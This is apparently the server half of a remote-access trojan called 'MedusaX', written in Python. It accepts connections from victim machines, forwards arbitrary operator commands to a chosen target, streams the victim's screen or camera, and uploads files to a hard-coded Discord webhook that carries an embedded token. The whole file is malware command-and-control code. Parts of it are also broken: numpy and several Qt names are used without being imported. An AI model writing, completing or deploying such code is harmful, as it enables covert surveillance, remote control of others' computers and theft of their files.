import socket
import threading
import os
import sys
import pyqt5
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
from PyQt5.QtGui import QImage, QPixmap
from PyQt5.QtCore import QThread, pyqtSignal
import cv2
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Discord Webhook URL for file uploads
WEBHOOK_URL = "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"

clients = {}
selected_client = None

class StreamThread(QThread):
    change_pixmap_signal = pyqtSignal(QImage)

    def __init__(self, conn):
        super().__init__()
        self.conn = conn

    def run(self):
        while True:
            try:
                length = self.conn.recv(16).decode()
                if length:
                    stringData = self.conn.recv(int(length))
                    data = np.frombuffer(stringData, dtype='uint8')
                    image = cv2.imdecode(data, 1)
                    rgb_image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
                    h, w, ch = rgb_image.shape
                    bytes_per_line = ch * w
                    convert_to_qt_format = QImage(rgb_image.data, w, h, bytes_per_line, QImage.Format_RGB888)
                    p = convert_to_qt_format.scaled(640, 480, Qt.KeepAspectRatio)
                    self.change_pixmap_signal.emit(p)
            except:
                break

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MedusaX Stream")
        self.setGeometry(100, 100, 800, 600)
        self.image_label = QLabel(self)
        self.setCentralWidget(self.image_label)

    @pyqtSlot(QImage)
    def set_image(self, image):
        self.image_label.setPixmap(QPixmap.fromImage(image))

def handle_client(conn, addr):
    global selected_client
    clients[addr[0]] = conn
    if not selected_client:
        selected_client = addr[0]

    while True:
        try:
            command = input("medusax > ")

            if command.startswith("!set target "):
                target_ip = command.split(" ")[2]
                if target_ip in clients:
                    selected_client = target_ip
                    print(f"[*] Target set to {target_ip}")

            elif command.startswith("!remove target "):
                target_ip = command.split(" ")[2]
                if target_ip in clients and selected_client == target_ip:
                    selected_client = None
                    print(f"[*] Target {target_ip} removed")

            elif command.startswith("!download "):
                file_path = command.split(" ")[1]
                send_file_to_webhook(file_path)

            elif command == "!list":
                for ip in clients:
                    status = "(selected)" if ip == selected_client else ""
                    print(f"{ip} {status}")

            elif command == "!stream":
                app = QApplication(sys.argv)
                main_window = MainWindow()
                main_window.show()
                stream_thread = StreamThread(clients[selected_client])
                stream_thread.change_pixmap_signal.connect(main_window.set_image)
                stream_thread.start()
                sys.exit(app.exec_())

            else:
                if selected_client:
                    clients[selected_client].sendall(command.encode())

        except KeyboardInterrupt:
            print("Shutting down server")
            for conn in clients.values():
                conn.close()
            break

def send_file_to_webhook(file_path):
    print("[*] Sending...")
    filename = os.path.basename(file_path)
    m = MultipartEncoder(
        fields={'file': (filename, open(file_path, 'rb'), 'application/octet-stream')}
    )
    r = requests.post(WEBHOOK_URL, data=m, headers={'Content-Type': m.content_type})
    if r.status_code == 200:
        print("[+] Sent!")
    else:
        print("[-] Failed to send file.")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[*] Server started on port 9999")

    while True:
        conn, addr = server.accept()
        print(f"[*] Connection from {addr}")
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

if __name__ == "__main__":
    start_server()
